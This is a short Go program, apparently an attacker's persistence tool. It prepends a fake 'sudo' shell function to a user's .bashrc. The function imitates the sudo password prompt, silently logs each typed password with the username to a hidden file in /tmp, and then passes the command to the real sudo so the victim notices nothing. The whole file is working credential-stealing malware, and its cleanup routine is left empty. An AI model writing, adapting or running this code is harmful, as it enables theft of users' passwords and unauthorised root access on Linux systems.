package main

import (
    "fmt"
    "os"
    "path/filepath"
    "flag"
)

var pbool_help = flag.Bool("h", false, "Usage.")
var pstr_out = flag.String("o", "/tmp/.stor-unix", "Stores goodies.")
var pstr_targetPath = flag.String("T", "", "Target; full path.")
var pstr_homePath = flag.String("t", ".bashrc", "Target; In home dir.")

func main() {
    flag.Parse()
    if *pbool_help {
        flag.Usage()
        os.Exit(0)
    }

    sudoShiv()
}

func sudoShiv() {

    shiv := `function sudo() {
    s="$(which sudo)"
    read -s -p "[sudo] password for $USER: " p
    printf "\n"; printf '%s\n' "$USER : ${p}\n" >> `
    shiv = shiv + fmt.Sprintf("%s\n", *pstr_out)
    shiv = shiv + `    ${s} -S <<< "${p}" -u root bash -c "exit" >/dev/null 2>&1
    ${s} "${@:1}"
}
`
    if (*pstr_targetPath) == "" {
        hDir, err := os.UserHomeDir()
        if err != nil {
            panic(err)
        }
        *pstr_targetPath = filepath.Join(hDir, *pstr_homePath)
    }

    f, err := os.ReadFile(*pstr_targetPath)
    if err != nil {
        fmt.Printf("[-] ReadFile\n")
        panic(err)
    }
    f = append([]byte(shiv), f...)

    err = os.WriteFile((*pstr_targetPath), f, 0644)
    if err != nil {
        fmt.Printf("[-] WriteFile\n")
        panic(err)
    }

}

func sudoUnShiv() {
    
}
